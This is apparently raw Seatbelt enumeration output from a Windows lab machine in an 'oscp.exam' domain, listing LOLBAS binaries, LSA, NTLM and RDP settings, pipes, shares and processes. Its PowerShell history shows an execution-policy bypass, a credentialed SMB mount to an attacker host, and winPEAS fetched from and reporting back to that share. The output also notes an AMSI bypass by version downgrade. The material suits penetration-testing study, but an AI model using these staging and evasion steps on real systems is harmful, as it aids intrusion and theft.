+Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8177f8d8487e2f89\WMIC.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8bcca32a7cdef184\WMIC.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8177f8d8487e2f89\f\WMIC.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8177f8d8487e2f89\r\WMIC.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8bcca32a7cdef184\f\WMIC.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ommand-line-utility_31bf3856ad364e35_10.0.22621.2792_none_8bcca32a7cdef184\r\WMIC.exe
+Path: C:\Windows\System32\wscript.exe
+Path: C:\Windows\SysWOW64\wscript.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\wscript.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\wscript.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\f\wscript.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\r\wscript.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\f\wscript.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\r\wscript.exe
+Path: C:\Windows\System32\wsl.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.22621.3672_none_62c579154a810adb\wsl.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.22621.3672_none_62c579154a810adb\f\wsl.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.22621.3672_none_62c579154a810adb\r\wsl.exe
+Path: C:\Windows\System32\WSReset.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.22621.2506_none_a6525f8f81a197b1\WSReset.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.22621.2506_none_a6525f8f81a197b1\f\WSReset.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..e-client-ui-wsreset_31bf3856ad364e35_10.0.22621.2506_none_a6525f8f81a197b1\r\WSReset.exe
+Path: C:\Windows\System32\xwizard.exe
+Path: C:\Windows\SysWOW64\xwizard.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.22621.1_none_ba89dc872c421abf\xwizard.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-xwizard-host-process_31bf3856ad364e35_10.0.22621.1_none_c4de86d960a2dcba\xwizard.exe
+Path: C:\Windows\System32\zipfldr.dll
+Path: C:\Windows\SysWOW64\zipfldr.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_5804e033b0cc6756\zipfldr.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_62598a85e52d2951\zipfldr.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_5804e033b0cc6756\f\zipfldr.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_5804e033b0cc6756\r\zipfldr.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_62598a85e52d2951\f\zipfldr.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-zipfldr_31bf3856ad364e35_10.0.22621.4249_none_62598a85e52d2951\r\zipfldr.dll
+Path: C:\Windows\System32\manage-bde.wsf
+Found: 465 LOLBAS
+
+To see how to use the LOLBAS that were found go to https://lolbas-project.github.io/
+====== LSASettings ======
+
+  auditbasedirectories           : 0
+  auditbaseobjects               : 0
+  Authentication Packages        : msv1_0
+  Bounds                         : 00-30-00-00-00-20-00-00
+  crashonauditfail               : 0
+  fullprivilegeauditing          : 00
+  LimitBlankPasswordUse          : 1
+  NoLmHash                       : 1
+  Notification Packages          : scecli
+  Security Packages              : ""
+  LsaPid                         : 748
+  LsaCfgFlagsDefault             : 0
+  SecureBoot                     : 1
+  ProductType                    : 4
+  disabledomaincreds             : 0
+  everyoneincludesanonymous      : 0
+  forceguest                     : 0
+  restrictanonymous              : 0
+  restrictanonymoussam           : 1
+  RunAsPPL                       : 0
+  IsPplAutoEnabled               : 1
+  SCENoApplyLegacyAuditPolicy    : 0
+  TurnOffAnonymousBlock          : 0
+  LsaConfigFlags                 : 0
+  RunAsPPLBoot                   : 0
+====== MappedDrives ======
+
+Mapped Drives (via WMI)
+
+ERROR:   [!] Terminating exception running command 'MappedDrives': System.NullReferenceException: Object reference not set to an instance of an object.
+   at Seatbelt.Commands.Windows.MappedDrivesCommand.<Execute>d__10.MoveNext()
+   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
+====== McAfeeConfigs ======
+
+====== McAfeeSiteList ======
+
+ERROR:   [!] Terminating exception running command 'McAfeeSiteList': System.NullReferenceException: Object reference not set to an instance of an object.
+   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
+====== MicrosoftUpdates ======
+
+Enumerating *all* Microsoft updates
+
+  KB2267602  2/22/2026 3:01:54 AM    MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
+  KB2267602  11/11/2024 6:50:21 PM   MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
+  KB2267602  10/29/2024 7:56:03 AM   MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
+  KB2267602  10/11/2024 2:26:30 AM   MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
+             10/9/2024 10:20:17 PM   Acquisition;DevHome_UO 9N8MHTPHNGVV-Microsoft.Windows.DevHome
+             10/9/2024 10:20:16 PM   Acquisition;DevHome_UO 9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
+             10/9/2024 10:20:16 PM   Acquisition;DevHome_UO 9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
+             10/9/2024 10:20:00 PM   Acquisition;CrossDevice_UO 9NTXGKQ8P7N0-MicrosoftWindows.CrossDevice
+             10/9/2024 10:20:00 PM   Acquisition;CrossDevice_UO 9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
+             10/9/2024 10:20:00 PM   Acquisition;CrossDevice_UO 9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
+  KB5044285  10/9/2024 7:15:03 PM    MoUpdateOrchestrator 2024-10 Cumulative Update for Windows 11 Version 23H2 for x64-based Systems (KB5044285)
+  KB4023057  10/9/2024 6:19:52 PM    MoUpdateOrchestrator 2023-11 Update for Windows 11 Version 23H2 for x64-based Systems (KB4023057)
+  KB890830   10/9/2024 6:19:48 PM    MoUpdateOrchestrator Windows Malicious Software Removal Tool x64 - v5.129 (KB890830)
+  KB5044033  10/9/2024 6:18:32 PM    MoUpdateOrchestrator 2024-10 Cumulative Update for .NET Framework 3.5 and 4.8.1 for Windows 11, version 23H2 for x64 (KB5044033)
+             10/9/2024 6:18:02 PM    MoUpdateOrchestrator Broadcom Inc. - Net - 1.9.19.0
+  KB2267602  10/9/2024 6:17:45 PM    MoUpdateOrchestrator Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
+====== NamedPipes ======
+
+2032,svchost,atsvc
+1060,svchost,Ctx_WinStation_API_service
+1004,svchost,epmapper
+1448,svchost,eventlog
+    SDDL         : O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
+3020,vmtoolsd,giTrayPipe0eabc146-2406-4edb-bbe7-f2adaa8f970c
+608,wininit,InitShutdown
+3752,msedgewebview2,LOCAL\crashpad_3752_YXBGRVGITCBSAATA
+    SDDL         : O:S-1-5-21-2481101513-2954867870-2660283483-1106G:DUD:(A;;FA;;;SY)(A;;FA;;;S-1-5-21-2481101513-2954867870-2660283483-1106)(A;;0x12019f;;;AC)
+0,Unk,LOCAL\mojo.3404.6896.6822827938938489019
+0,Unk,LOCAL\mojo.3752.7232.11441647077005904461
+0,Unk,LOCAL\mojo.3752.7232.12674074188932973515
+0,Unk,LOCAL\mojo.3752.7232.3421434372077058219
+0,Unk,LOCAL\mojo.3752.7232.8348170557681399869
+0,Unk,LOCAL\mojo.3752.7352.1223149022151446966
+0,Unk,LOCAL\mojo.3752.7352.16878035828237358043
+0,Unk,LOCAL\mojo.3752.7352.6943523179129756811
+0,Unk,LOCAL\mojo.3752.7352.7094935669482349185
+0,Unk,LOCAL\mojo.3752.7352.7765783054657177288
+0,Unk,LOCAL\mojo.3752.7352.7827711408126963804
+0,Unk,LOCAL\mojo.3752.7352.861895670992531673
+748,lsass,lsass
+412,svchost,LSM_API_service
+5172,SearchIndexer,MsFteWds
+716,services,ntsvcs
+0,Unk,PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+4236,powershell,PSHost.134162030965905639.4236.DefaultAppDomain.powershell
+9116,powershell,PSHost.134162032898124931.9116.DefaultAppDomain.powershell
+2276,svchost,SessEnvPublicRpc
+3168,svchost,srvsvc
+1060,svchost,TermSrv_API_service
+3108,svchost,trkwks
+0,Unk,TSVCPIPE-19c1492e-adcd-4d4d-9259-38c99b6ee60d
+3004,VGAuthService,vgauth-service
+    SDDL         : O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
+1324,svchost,W32TIME_ALT
+3404,Widgets,WidgetsCommandPipe
+0,Unk,Winsock2\CatalogChangeListener-19c-0
+0,Unk,Winsock2\CatalogChangeListener-260-0
+0,Unk,Winsock2\CatalogChangeListener-2cc-0
+0,Unk,Winsock2\CatalogChangeListener-2ec-0
+0,Unk,Winsock2\CatalogChangeListener-3ec-0
+0,Unk,Winsock2\CatalogChangeListener-5a8-0
+0,Unk,Winsock2\CatalogChangeListener-7f0-0
+0,Unk,Winsock2\CatalogChangeListener-8e4-0
+1944,svchost,wkssvc
+====== NetworkProfiles ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== NetworkShares ======
+
+  Name                           : ADMIN$
+  Path                           : C:\Windows
+  Description                    : Remote Admin
+  Type                           : Disk Drive Admin
+
+  Name                           : C$
+  Path                           : C:\
+  Description                    : Default share
+  Type                           : Disk Drive Admin
+
+  Name                           : IPC$
+  Path                           : 
+  Description                    : Remote IPC
+  Type                           : IPC Admin
+
+====== NTLMSettings ======
+
+  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)
+
+  NTLM Signing Settings
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : False
+      ServerNegotiateSigning  : False
+      LdapSigning             : 1 (Negotiate signing)
+
+  Session Security
+      NTLMMinClientSec        : 536870912 (Require128BitKey)
+      NTLMMinServerSec        : 536870912 (Require128BitKey)
+
+
+  NTLM Auditing and Restrictions
+      InboundRestrictions     : (Not defined)
+      OutboundRestrictions    : (Not defined)
+      InboundAuditing         : (Not defined)
+      OutboundExceptions      : 
+====== OfficeMRUs ======
+
+Enumerating Office most recently used files for the last 7 days
+
+  App       User                     LastAccess    FileName
+  ---       ----                     ----------    --------
+====== OneNote ======
+
+
+    OneNote files (Administrator):
+
+
+
+    OneNote files (r.andrews):
+
+
+====== OptionalFeatures ======
+
+State    Name                                               Caption
+Enabled  MediaPlayback                                      Media Features
+Enabled  MicrosoftWindowsPowerShellV2                       Windows PowerShell 2.0 Engine
+Enabled  MicrosoftWindowsPowerShellV2Root                   Windows PowerShell 2.0
+Enabled  MSRDC-Infrastructure                               Remote Differential Compression API Support
+Enabled  NetFx4-AdvSrvs                                     .NET Framework 4.8 Advanced Services
+Enabled  Printing-Foundation-Features                       Print and Document Services
+Enabled  Printing-Foundation-InternetPrinting-Client        Internet Printing Client
+Enabled  Printing-PrintToPDFServices-Features               Microsoft Print to PDF
+Enabled  SearchEngine-Client-Package                        Windows Search
+Enabled  SmbDirect                                          SMB Direct
+Enabled  WCF-Services45                                     WCF Services
+Enabled  WCF-TCP-PortSharing45                              TCP Port Sharing
+Enabled  Windows-Defender-Default-Definitions               
+Enabled  WindowsMediaPlayer                                 Windows Media Player Legacy (App)
+Enabled  WorkFolders-Client                                 Work Folders Client
+====== OracleSQLDeveloper ======
+
+====== OSInfo ======
+
+  Hostname                      :  WS26
+  Domain Name                   :  oscp.exam
+  Username                      :  OSCP\r.andrews
+  ProductName                   :  Windows 10 Enterprise
+  EditionID                     :  Enterprise
+  ReleaseId                     :  2009
+  Build                         :  22631.4317
+  BuildBranch                   :  ni_release
+  CurrentMajorVersionNumber     :  10
+  CurrentVersion                :  6.3
+  Architecture                  :  AMD64
+  ProcessorCount                :  2
+  IsVirtualMachine              :  True
+  BootTimeUtc (approx)          :  2/22/2026 2:45:52 AM (Total uptime: 00:01:23:34)
+  HighIntegrity                 :  False
+  IsLocalAdmin                  :  False
+  CurrentTimeUtc                :  2/22/2026 4:09:26 AM (Local time: 2/21/2026 8:09:26 PM)
+  TimeZone                      :  Pacific Standard Time
+  TimeZoneOffset                :  -08:00:00
+  InputLanguage                 :  Japanese
+  InstalledInputLanguages       :  Japanese, US, Japanese
+  MachineGuid                   :  63170b82-467f-4fa8-8c64-b9db48dbab26
+====== OutlookDownloads ======
+
+====== PoweredOnEvents ======
+
+Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days
+
+Powered On Events (Time is local time)
+====== PowerShell ======
+
+
+  Installed CLR Versions
+      4.0.30319
+
+  Installed PowerShell Versions
+      2.0
+        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
+      5.1.22621.1
+
+  Transcription Logging Settings
+      Enabled            : False
+      Invocation Logging : False
+      Log Directory      : 
+
+  Module Logging Settings
+      Enabled             : False
+      Logged Module Names :
+
+  Script Block Logging Settings
+      Enabled            : False
+      Invocation Logging : False
+
+  Anti-Malware Scan Interface (AMSI)
+      OS Supports AMSI: True
+        [!] You can do a PowerShell version downgrade to bypass AMSI.
+====== PowerShellEvents ======
+
+Searching script block logs (EID 4104) for sensitive data.
+
+====== PowerShellHistory ======
+
+  UserName                       : r.andrews
+  FileName                       : C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+  Match                          : net use \\192.168.49.104\share /user:username pw
+
+  Context                        : cd ~
+powershell -ep bypass
+net use \\192.168.49.104\share /user:username pw
+cp \\192.168.49.104\share\winPEASx64.exe .
+.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
+net use
+
+====== Printers ======
+
+ERROR:   [!] Terminating exception running command 'Printers': System.Management.ManagementException: Generic failure 
+   at System.Management.ManagementException.ThrowWithExtendedInfo(ManagementStatus errorCode)
+   at System.Management.ManagementObjectCollection.ManagementObjectEnumerator.MoveNext()
+   at Seatbelt.Commands.Windows.PrintersCommand.<Execute>d__9.MoveNext()
+   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
+====== ProcessCreationEvents ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== Processes ======
+
+Collecting Non Microsoft Processes (via WMI)
+
+ ProcessName                              : vmtoolsd
+ ProcessId                                : 1292
+ ParentProcessId                          : 4916
+ CompanyName                              : VMware, Inc.
+ Description                              : VMware Tools Core Service
+ Version                                  : 12.1.0.37487
+ Path                                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+ CommandLine                              : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+ IsDotNet                                 : False
+ ProcessProtectionInformation             : 
+
+====== ProcessOwners ======
+
+ rdpclip.exe                                        6920       OSCP\r.andrews
+ sihost.exe                                         4124       OSCP\r.andrews
+ svchost.exe                                        4352       OSCP\r.andrews
+ svchost.exe                                        3964       OSCP\r.andrews
+ taskhostw.exe                                      6740       OSCP\r.andrews
+ explorer.exe                                       4916       OSCP\r.andrews
+ svchost.exe                                        7640       OSCP\r.andrews
+ SearchHost.exe                                     8052       OSCP\r.andrews
+ StartMenuExperienceHost.exe                        8060       OSCP\r.andrews
+ RuntimeBroker.exe                                  8164       OSCP\r.andrews
+ svchost.exe                                        7288       OSCP\r.andrews
+ Widgets.exe                                        3404       OSCP\r.andrews
+ RuntimeBroker.exe                                  7400       OSCP\r.andrews
+ dllhost.exe                                        8556       OSCP\r.andrews
+ ctfmon.exe                                         7088       OSCP\r.andrews
+ UserOOBEBroker.exe                                 6636       OSCP\r.andrews
+ TextInputHost.exe                                  8828       OSCP\r.andrews
+ vmtoolsd.exe                                       1292       OSCP\r.andrews
+ powershell.exe                                     4236       OSCP\r.andrews
+ conhost.exe                                        6776       OSCP\r.andrews
+ Notepad.exe                                        1916       OSCP\r.andrews
+ dllhost.exe                                        4796       OSCP\r.andrews
+ svchost.exe                                        7248       OSCP\r.andrews
+ OneDrive.exe                                       9012       OSCP\r.andrews
+ powershell.exe                                     9116       OSCP\r.andrews
+ msedgewebview2.exe                                 3752       OSCP\r.andrews
+ msedgewebview2.exe                                 5800       OSCP\r.andrews
+ msedgewebview2.exe                                 8588       OSCP\r.andrews
+ msedgewebview2.exe                                 4172       OSCP\r.andrews
+ msedgewebview2.exe                                 1460       OSCP\r.andrews
+ msedgewebview2.exe                                 9004       OSCP\r.andrews
+ ShellExperienceHost.exe                            8944       OSCP\r.andrews
+ svchost.exe                                        8084       OSCP\r.andrews
+ Seatbelt.exe                                       3180       OSCP\r.andrews
+====== PSSessionSettings ======
+
+ERROR: Unable to collect. Must be an administrator.
+====== PuttyHostKeys ======
+
+====== PuttySessions ======
+
+====== RDCManFiles ======
+
+====== RDPSavedConnections ======
+
+====== RDPSessions ======
+
+  SessionID                     :  0
+  SessionName                   :  Services
+  UserName                      :  \
+  State                         :  Disconnected
+  HostName                      :  
+  FarmName                      :  
+  LastInput                     :  04h:09m:57s:739ms
+  ClientIP                      :  
+  ClientHostname                :  
+  ClientResolution              :  
+  ClientBuild                   :  0
+  ClientHardwareId              :  0,0,0,0
+  ClientDirectory               :  
+
+  SessionID                     :  1
+  SessionName                   :  Console
+  UserName                      :  \
+  State                         :  Connected
+  HostName                      :  
+  FarmName                      :  
+  LastInput                     :  04h:10m:22s:248ms
+  ClientIP                      :  
+  ClientHostname                :  
+  ClientResolution              :  640x480 @ 2 bits per pixel
+  ClientBuild                   :  0
+  ClientHardwareId              :  0,0,0,0
+  ClientDirectory               :  
+
+  SessionID                     :  2
+  SessionName                   :  RDP-Tcp#0
+  UserName                      :  OSCP\r.andrews
+  State                         :  Active
+  HostName                      :  
+  FarmName                      :  
+  LastInput                     :  00h:04m:10s:702ms
+  ClientIP                      :  192.168.49.104
+  ClientHostname                :  kali
+  ClientResolution              :  1024x768 @ 32 bits per pixel
+  ClientBuild                   :  18363
+  ClientHardwareId              :  0,0,0,0
+  ClientDirectory               :  C:\Windows\System32\mstscax.dll
+
+====== RDPsettings ======
+
+RDP Server Settings:
+  NetworkLevelAuthentication: 
+  BlockClipboardRedirection:  
+  BlockComPortRedirection:    
+  BlockDriveRedirection:      
+  BlockLptPortRedirection:    
+  BlockPnPDeviceRedirection:  
+  BlockPrinterRedirection:    
+  AllowSmartCardRedirection:  
+
+RDP Client Settings:
+  DisablePasswordSaving: True
+  RestrictedRemoteAdministration: False
+====== RecycleBin ======
+
+Recycle Bin Files Within the last 30 Days
+
+====== reg ======
+
+HKLM\Software ! (default) : 
+HKLM\Software\Classes ! (default) : 
+HKLM\Software\Clients ! (default) : 
+HKLM\Software\CVSM ! (default) : 
+HKLM\Software\DefaultUserEnvironment ! (default) : 
+HKLM\Software\Google ! (default) : 
+HKLM\Software\Intel ! (default) : 
+HKLM\Software\Microsoft ! (default) : 
+HKLM\Software\ODBC ! (default) : 
+HKLM\Software\OEM ! (default) : 
+HKLM\Software\OpenSSH ! (default) : 
+HKLM\Software\Partner ! (default) : 
+HKLM\Software\Policies ! (default) : 
+HKLM\Software\RegisteredApplications ! (default) : 
+HKLM\Software\Setup ! (default) : 
+HKLM\Software\SimonTatham ! (default) : 
+HKLM\Software\VMware, Inc. ! (default) : 
+HKLM\Software\WOW6432Node ! (default) : 
+====== RPCMappedEndpoints ======
+
+  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49669]
+  cc105610-da03-467e-bc73-5b9e2937458d v1.0 (LiveIdSvc RPC Interface): ncalrpc:[LRPC-eca8c8795546f36a66]
+  faf2447b-b348-4feb-8dbe-beee5b7f7778 v1.0 (OnlineProviderCert RPC Interface): ncalrpc:[LRPC-eca8c8795546f36a66]
+  572e35b4-1344-4565-96a1-f5df3bfa89bb v1.0 (LiveIdSvcNotify RPC Interface): ncalrpc:[liveidsvcnotify]
+  d2716e94-25cb-4820-bc15-537866578562 v1.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
+  d2716e94-25cb-4820-bc15-537866578562 v1.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
+  0c53aa2e-fb1c-49c5-bfb6-c54f8e5857cd v1.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
+  0c53aa2e-fb1c-49c5-bfb6-c54f8e5857cd v1.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
+  923c9623-db7f-4b34-9e6d-e86580f8ca2a v1.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
+  923c9623-db7f-4b34-9e6d-e86580f8ca2a v1.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
+  e8748f69-a2a4-40df-9366-62dbeb696e26 v0.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
+  e8748f69-a2a4-40df-9366-62dbeb696e26 v0.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
+  c8ba73d2-3d55-429c-8e9a-c44f006f69fc v0.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
+  c8ba73d2-3d55-429c-8e9a-c44f006f69fc v0.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
+  43890c94-bfd7-4655-ad6a-b4a68397cdcb v0.0 (): ncalrpc:[OLE5361BDC3E3719A90B7AB64F1319A]
+  43890c94-bfd7-4655-ad6a-b4a68397cdcb v0.0 (): ncalrpc:[LRPC-26af8aaa87bc4e2072]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLED908773E42EA8D853322B7132422]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-0ab021e7016e13f0c5]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLED908773E42EA8D853322B7132422]
+  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-0ab021e7016e13f0c5]
+  0497b57d-2e66-424f-a0c6-157cd5d41700 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
+  201ef99a-7fa0-444c-9399-19ba84f12a1a v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
+  5f54ce7d-5b79-4175-8584-cb65313a0e98 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
+  fd7a0523-dc70-43dd-9b2e-9c5ed48225b1 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
+  58e604e8-9adb-4d2e-a464-3b0683fb1480 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
+  0f738e20-73c0-4ca8-aa6a-8dfef545fea8 v1.0 (AppInfo): ncalrpc:[LRPC-aca94d80134d491e21]
+  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[OLE47F1E79007464BA6BB05F7CF9943]
+  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[LRPC-87cd004c1b4ff0d852]
+  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[OLE47F1E79007464BA6BB05F7CF9943]
+  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[LRPC-87cd004c1b4ff0d852]
+  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[OLE47F1E79007464BA6BB05F7CF9943]
+  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[LRPC-87cd004c1b4ff0d852]
+  169c453b-5955-4672-be44-21f61e9ef18f v1.0 (INgcContainerEnum): ncalrpc:[LRPC-8e96dc8a1e22359b4e]
+  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0283DDA2]
+  12e65dd8-887f-41ef-91bf-8d816c42c2e7 v1.0 (Secure Desktop LRPC interface): ncalrpc:[WMsgKRpc0283DDA2]
+  a4b8d482-80ce-40d6-934d-b22a01a44fe7 v1.0 (LicenseManager): ncalrpc:[LicenseServiceEndpoint]
+  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[OLE24CD9BF27988B7D1F33155C047E6]
+  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[LRPC-b00f1f1331cd39e3e6]
+  10d20e7a-2530-494a-ac01-b8dd04480ad2 v1.0 (camsvc): ncalrpc:[OLE1144935BC48C54548FEEF37542F0]
+  10d20e7a-2530-494a-ac01-b8dd04480ad2 v1.0 (camsvc): ncalrpc:[LRPC-262d31e48f8c5a5424]
+  b04d3c44-f014-4530-88f3-ee7daa3e69b9 v1.0 (): ncalrpc:[LRPC-9faeabd6b287a30861]
+  0767a036-0d22-48aa-ba69-b619480f38cb v1.0 (PcaSvc): ncalrpc:[LRPC-42fae51ab02cdeeb98]
+  44d1520b-6133-41f0-8a66-d37305ecc357 v0.0 (): ncalrpc:[LRPC-2778dbe763fda6453d]
+  f5663d1c-7cd6-4109-9d01-2c187b75c38f v0.0 (): ncalrpc:[LRPC-2778dbe763fda6453d]
+  4b112204-0e19-11d3-b42b-0000f81feb9f v1.0 (): ncalrpc:[LRPC-f439951824b902db90]
+  c27f3c08-92ba-478c-b446-b419c4cef0e2 v1.0 (): ncalrpc:[LRPC-b104b1d2327c4c2578]
+  f3f09ffd-fbcf-4291-944d-70ad6e0e73bb v1.0 (): ncalrpc:[LRPC-3203b50960c53dd7fc]
+  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0AAA31]
+  7df1ceae-de4e-4e6f-ab14-49636e7c2052 v1.0 (): ncalrpc:[LRPC-6d038f1ea08ad9648d]
+  d4051bde-9cdd-4910-b393-4aa85ec3c482 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
+  d4051bde-9cdd-4910-b393-4aa85ec3c482 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
+  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
+  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
+  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
+  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
+  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
+  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
+  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
+  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
+  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
+  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
+  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[OLECAF04B83661D2D50D639CDAD0D8B]
+  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[LRPC-0941eed42687b5eff6]
